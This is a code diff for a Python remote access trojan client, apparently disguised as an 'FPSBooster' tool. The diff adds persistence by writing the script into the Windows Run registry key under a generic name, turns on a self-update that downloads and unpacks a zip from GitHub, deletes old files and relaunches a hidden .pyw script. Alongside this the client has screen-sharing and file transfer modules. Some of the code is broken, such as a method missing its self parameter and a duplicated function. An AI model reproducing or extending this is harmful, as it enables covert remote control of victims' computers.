@@ -1,3 +1,6 @@
+from modules.filedownload import FileDownload
+from modules.fileupload import FileTransfer
+from modules.screenshare import ScreenShare
 import socket
 import subprocess
 import os
@@ -14,10 +17,13 @@ import sys
 import zipfile
 import json
 import getpass
+import winreg as _winreg
+import shutil
 
-from modules.screenshare import ScreenShare
-from modules.fileupload import FileTransfer
-from modules.filedownload import FileDownload
+script_dir = os.path.dirname(os.path.abspath(__file__))
+
+# Append the script directory to sys.path to make the imports work from anywhere
+sys.path.append(script_dir)
 
 
 user32 = ctypes.WinDLL('user32')
@@ -42,7 +48,9 @@ class RAT_CLIENT:
         self.command_history = []
 
         # TODO: Add a function to check if the RAT is up to date
-        # self.check_version()
+        self.check_version()
+
+        self.add_to_startup_registry()
 
         self.screenshareClient = ScreenShare()
 
@@ -64,6 +72,32 @@ class RAT_CLIENT:
             target=self.file_download_manager.connect
         )
         self.file_download_thread.start()
+
+    def add_to_startup_registry():
+        try:
+            key = _winreg.HKEY_CURRENT_USER
+            sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            value_name = "MyPythonScript"
+            script_path = os.path.abspath(__file__)
+
+            # Open the registry key for writing
+            registry_key = _winreg.OpenKey(key, sub_key, 0, _winreg.KEY_WRITE)
+
+            # Check if the value already exists in the registry
+            existing_value, _ = _winreg.QueryValueEx(registry_key, value_name)
+
+            if existing_value == f'"{script_path}"':
+                print("Script is already in startup, no action needed.")
+            else:
+                # Add the script to the startup list with "runas" verb
+                _winreg.SetValueEx(registry_key, value_name,
+                                   0, _winreg.REG_SZ, f'"{script_path}" runas')
+                print("Script added to startup with admin privileges.")
+
+            # Close the registry key
+            _winreg.CloseKey(registry_key)
+        except Exception as e:
+            print(f"Error adding to startup registry: {str(e)}")
 
     def build_connection(self):
         try:
@@ -294,10 +328,10 @@ class RAT_CLIENT:
         print("Current version:", current_version)
 
         if self.github_version != current_version:
-            # The versions are different, so we need to update
-            # Download the new version
             print("Versions are different")
-            self.download_new_version(self.github_version)
+            self.download_new_version()
+        else:
+            print("Versions are the same")
 
     def download_new_version(self):
         # Download the new version
@@ -328,6 +362,39 @@ class RAT_CLIENT:
         print("Restarting RAT...")
         # Exit the current RAT
         sys.exit(0)
+
+    def download_new_version(self):
+        try:
+            # Download the new version
+            response = requests.get(
+                "https://github.com/lukasolsen/FPSBooster/archive/main.zip")
+
+            # Write the zip file to disk
+            with open("new_version.zip", "wb") as f:
+                f.write(response.content)
+
+            # Extract the zip file into the current directory
+            with zipfile.ZipFile("new_version.zip", "r") as zip_ref:
+                zip_ref.extractall()
+
+            # Delete the zip file
+            os.remove("new_version.zip")
+
+            # Remove the old version files and directories
+            old_version_dir = "FPSBooster"
+            if os.path.exists(old_version_dir):
+                shutil.rmtree(old_version_dir)
+
+            # Rename the extracted directory to the desired name
+            os.rename("FPSBooster-main", old_version_dir)
+
+            # Restart the RAT
+            subprocess.Popen(["python", "main.pyw"])
+
+            # Exit the current RAT
+            sys.exit(0)
+        except Exception as e:
+            print(f"Error updating: {str(e)}")
 
 
 if __name__ == '__main__':
